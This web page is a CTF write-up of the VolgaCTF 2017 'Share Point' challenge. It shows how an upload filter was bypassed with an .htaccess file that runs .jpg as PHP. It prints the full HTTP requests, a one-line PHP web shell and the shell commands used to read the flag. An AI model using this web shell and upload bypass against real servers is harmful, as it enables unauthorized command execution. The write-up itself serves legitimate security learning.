<!doctype html><html lang=en-us>
<head>
<link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<title> VolgaCTF 2017: Share Point - web 200 | ChaGu CTF</title>
<link rel=canonical href=https://chagu.org/posts/volgactf-2017-quals_share_point_web_200/>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=robots content="all,follow">
<meta name=googlebot content="index,follow,snippet,archive">
<meta property="og:title" content="VolgaCTF 2017: Share Point - web 200">
<meta property="og:description" content="Author: @mjdubell
Share Point Look! I wrote a good service for sharing your files with your friends, enjoy) share-point.quals.2017.volgactf.ru The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability to upload files and share them with an other user. Since the site only had one functionality, uploading files, I assumed the goal had to be to upload a web shell and find the flag on the file system.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://chagu.org/posts/volgactf-2017-quals_share_point_web_200/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2017-03-26T11:22:32+02:00">
<meta property="article:modified_time" content="2017-03-26T11:22:32+02:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="VolgaCTF 2017: Share Point - web 200">
<meta name=twitter:description content="Author: @mjdubell
Share Point Look! I wrote a good service for sharing your files with your friends, enjoy) share-point.quals.2017.volgactf.ru The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability to upload files and share them with an other user. Since the site only had one functionality, uploading files, I assumed the goal had to be to upload a web shell and find the flag on the file system.">
<link rel=stylesheet href=https://chagu.org/css/styles.877f0d187d777677210859d158f899b22bc9251cff14ab3f2aeaaf7e09c4b15a691db4d151e8f0be980792a40c8d658ffb0a5ed37ea53eccec5125ee4e6055b7.css integrity="sha512-h38NGH13dnchCFnRWPiZsivJJRz/FKs/KuqvfgnEsVppHbTRUejwvpgHkqQMjWWP+wpe036lPszsUSXuTmBVtw=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script>
<script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]-->
<link rel=icon type=image/png href=https://chagu.org/images/favicon.ico>
</head>
<body class="max-width mx-auto px3 ltr">
<div class="content index py4">
<div id=header-post>
<a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast')" style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu>
<span id=nav>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</span>
<br>
<span id=actions>
<ul>
<li>
<a class=icon href=https://chagu.org/posts/pragyan-ctf-2017_bin1/ aria-label=Previous>
<i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle()" onmouseout="$('#i-prev').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=https://chagu.org/posts/volgactf-2017-quals_bloody_feedback_web_100/ aria-label=Next>
<i class="fas fa-chevron-right" aria-hidden=true onmouseover="$('#i-next').toggle()" onmouseout="$('#i-next').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle()" onmouseout="$('#i-top').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# aria-label=Share>
<i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle()" onmouseout="$('#i-share').toggle()" onclick="return $('#share').toggle(),!1"></i>
</a>
</li>
</ul>
<span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span>
</span>
<br>
<div id=share style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f" aria-label=Facebook>
<i class="fab fa-facebook" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&text=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label=Twitter>
<i class="fab fa-twitter" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&title=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label=Linkedin>
<i class="fab fa-linkedin" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&is_video=false&description=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label=Pinterest>
<i class="fab fa-pinterest" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200&body=Check out this article: https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f" aria-label=Email>
<i class="fas fa-envelope" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&title=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label=Pocket>
<i class="fab fa-get-pocket" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&title=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label=reddit>
<i class="fab fa-reddit" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&name=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200&description=Author%3a%20%40mjdubell%0aShare%20Point%20Look%21%20I%20wrote%20a%20good%20service%20for%20sharing%20your%20files%20with%20your%20friends%2c%20enjoy%29%20share-point.quals.2017.volgactf.ru%20The%20challenge%20begun%20by%20signing%20in%20to%20the%20control%20panel%20by%20simply%20entering%20random%20account%20details.%20Once%20logged%20in%20you%20had%20the%20ability%20to%20upload%20files%20and%20share%20them%20with%20an%20other%20user.%20Since%20the%20site%20only%20had%20one%20functionality%2c%20uploading%20files%2c%20I%20assumed%20the%20goal%20had%20to%20be%20to%20upload%20a%20web%20shell%20and%20find%20the%20flag%20on%20the%20file%20system." aria-label=Tumblr>
<i class="fab fa-tumblr" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&t=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label="Hacker News">
<i class="fab fa-hacker-news" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=toc>
<nav id=TableOfContents></nav>
</div>
</span>
</div>
<article class=post itemscope itemtype=http://schema.org/BlogPosting>
<header>
<h1 class=posttitle itemprop="name headline">
VolgaCTF 2017: Share Point - web 200
</h1>
<div class=meta>
<div class=postdate>
<time datetime="2017-03-26 11:22:32 +0200 +0200" itemprop=datePublished>2017-03-26</time>
</div>
<div class=article-read-time>
<i class="far fa-clock"></i>
2 minute read
</div>
<div class=article-tag>
<i class="fas fa-tag"></i>
<a class=tag-link href=/tags/web rel=tag>Web</a>
,
<a class=tag-link href=/tags/php rel=tag>PHP</a>
</div>
</div>
</header>
<div class=content itemprop=articleBody>
<p>Author: <a href=https://twitter.com/mjdubell>@mjdubell</a></p>
<pre tabindex=0><code>Share Point

Look! I wrote a good service for sharing your files with your friends, enjoy)
share-point.quals.2017.volgactf.ru
</code></pre><p>The challenge begun by signing in to the control panel by simply entering random account details. Once logged in you had the ability to upload files and share them with an other user. Since the site only had one functionality, uploading files, I assumed the goal had to be to upload a web shell and find the flag on the file system.</p>
<p>Uploading files with a <code>.php</code> extension got rejected. I tried some tricks when trying to upload my <code>shell.php</code>:</p>
<ul>
<li>Chaning the Content Type to <code>image/jpeg</code>.</li>
<li>Injecting null values in the filename <code>shell.php\00.gif</code>.</li>
<li>Uploading a file with the magic headers of a gif file.</li>
</ul>
<p>Next I tried to upload an <code>.htaccess</code> file with the following contents <code>AddType application/x-httpd-php .jpg</code>, this would cause <code>.jpg</code> files to executed as <code>.php</code> files, and it worked!</p>
<p>The following code snippet shows the HTTP POST request from Burp Suite when uploading the <code>.htaccess</code> file and the following <code>shell.php.jpg</code>.</p>
<pre tabindex=0><code>POST /upload.php HTTP/1.1
Host: share-point.quals.2017.volgactf.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://share-point.quals.2017.volgactf.ru/upload.php
Content-Length: 271
Content-Type: multipart/form-data; boundary=---------------------------1620217569904038223723611436
Cookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690
Connection: close

-----------------------------1620217569904038223723611436
Content-Disposition: form-data; name=&quot;userFile&quot;; filename=&quot;.htaccess&quot;
Content-Type: application/octet-stream

AddType application/x-httpd-php .jpg

-----------------------------1620217569904038223723611436--
</code></pre><pre tabindex=0><code>POST /upload.php HTTP/1.1
Host: share-point.quals.2017.volgactf.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://share-point.quals.2017.volgactf.ru/upload.php
Content-Length: 256
Content-Type: multipart/form-data; boundary=---------------------------5375118911646132755521388984
Cookie: PHPSESSID=gsl3b673of0kbvaav8am0vs690
Connection: close

-----------------------------5375118911646132755521388984
Content-Disposition: form-data; name=&quot;userFile&quot;; filename=&quot;shell.php.jpg&quot;
Content-Type: image/jpeg

&lt;?php system($_GET['cmd']); ?&gt;

-----------------------------5375118911646132755521388984--
</code></pre><p>Once we have uploaded the shell, we can start looking for the flag on the file system.</p>
<pre tabindex=0><code>http://share-point.quals.2017.volgactf.ru/files/Smacker1/shell.php.jpg?cmd=ls -lah

total 24K
drwxr-xr-x   2 www-data www-data 4.0K Mar 27 00:05 .
drwxr-xr-x 252 www-data www-data  12K Mar 27 00:04 ..
-rw-r--r--   1 www-data www-data   37 Mar 27 00:04 .htaccess
-rw-r--r--   1 www-data www-data   31 Mar 27 00:05 shell.php.jpg
</code></pre><p>By pure luck I checked the <code>/opt/</code> folder and found <code>flag.txt</code>. Otherwise I would have simply searched for &ldquo;flag&rdquo;.</p>
<pre tabindex=0><code>http://share-point.quals.2017.volgactf.ru/files/shell.php.jpg?cmd=cat /opt/flag.txt
VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}
</code></pre>
</div>
</article>
<div id=footer-post-container>
<div id=footer-post>
<div id=nav-footer style=display:none>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</div>
<div id=toc-footer style=display:none>
<nav id=TableOfContents></nav>
</div>
<div id=share-footer style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f" aria-label=Facebook>
<i class="fab fa-facebook fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&text=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label=Twitter>
<i class="fab fa-twitter fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&title=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label=Linkedin>
<i class="fab fa-linkedin fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&is_video=false&description=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label=Pinterest>
<i class="fab fa-pinterest fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200&body=Check out this article: https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f" aria-label=Email>
<i class="fas fa-envelope fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&title=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label=Pocket>
<i class="fab fa-get-pocket fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&title=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label=reddit>
<i class="fab fa-reddit fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&name=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200&description=Author%3a%20%40mjdubell%0aShare%20Point%20Look%21%20I%20wrote%20a%20good%20service%20for%20sharing%20your%20files%20with%20your%20friends%2c%20enjoy%29%20share-point.quals.2017.volgactf.ru%20The%20challenge%20begun%20by%20signing%20in%20to%20the%20control%20panel%20by%20simply%20entering%20random%20account%20details.%20Once%20logged%20in%20you%20had%20the%20ability%20to%20upload%20files%20and%20share%20them%20with%20an%20other%20user.%20Since%20the%20site%20only%20had%20one%20functionality%2c%20uploading%20files%2c%20I%20assumed%20the%20goal%20had%20to%20be%20to%20upload%20a%20web%20shell%20and%20find%20the%20flag%20on%20the%20file%20system." aria-label=Tumblr>
<i class="fab fa-tumblr fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_share_point_web_200%2f&t=VolgaCTF%202017%3a%20Share%20Point%20-%20web%20200" aria-label="Hacker News">
<i class="fab fa-hacker-news fa-lg" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=actions-footer>
<a id=menu-toggle class=icon href=# onclick="return $('#nav-footer').toggle(),!1" aria-label=Menu>
<i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick="return $('#toc-footer').toggle(),!1" aria-label=TOC>
<i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick="return $('#share-footer').toggle(),!1" aria-label=Share>
<i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a>
</div>
</div>
</div>
<footer id=footer>
<div class=footer-left>
Copyright &copy; 2021 ChaGu CTF
</div>
<div class=footer-right>
<nav>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</nav>
</div>
</footer>
</div>
</body>
<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>
<script src=/js/code-copy.js></script>
</html>